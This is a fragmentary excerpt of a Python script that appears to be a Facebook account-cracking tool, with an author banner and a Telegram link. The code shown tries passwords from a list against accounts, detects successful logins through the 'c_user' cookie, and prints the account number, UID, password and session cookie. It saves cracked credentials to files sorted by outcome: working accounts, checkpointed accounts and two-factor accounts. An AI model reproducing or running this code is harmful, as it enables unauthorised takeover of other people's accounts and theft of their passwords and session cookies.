...
oks = []
twf = []
os.system('https://youtube.com/channel/UCn8NT5UDp71Pppgswqp3DLw')
os.system('https://youtube.com/channel/UCn8NT5UDp71Pppgswqp3DLw')
...

  ...
  𝐀𝐮𝐭𝐇𝐨𝐑   :   𝐒𝐚𝐛𝐚𝐰𝐨𝐨𝐧 𝐍𝐢𝐚𝐳𝐢
  𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 :   𝐒𝐚𝐛𝐚𝐰𝐨𝐨𝐧 𝐍𝐢𝐚𝐳𝐢
  𝐘𝐨𝐮 𝐓𝐮𝐛𝐞    :   𝐀𝐟𝐠𝐡𝐚𝐧 𝐓𝐞𝐜𝐡𝐧𝐢𝐜𝐚𝐥
  𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦  :   https://t.me/SABAWOON_HACK_001
  𝐓𝐨𝐨𝐥 𝐒𝐭𝐚𝐭𝐮𝐬:  𝐅𝐫𝐞𝐞                            
\033[1;91m=========================================================="""
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[𝐬𝐚𝐛𝐚𝐰𝐨𝐨𝐧-𝐨𝐤]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/𝐬𝐚𝐛𝐚𝐰𝐨𝐨𝐧-𝐨𝐤.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[𝐬𝐚𝐛𝐚𝐰𝐨𝐨𝐧-CP]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/𝐬𝐚𝐛𝐚𝐰𝐨𝐨𝐧-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/𝐬𝐚𝐛𝐚𝐰𝐨𝐨𝐧-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
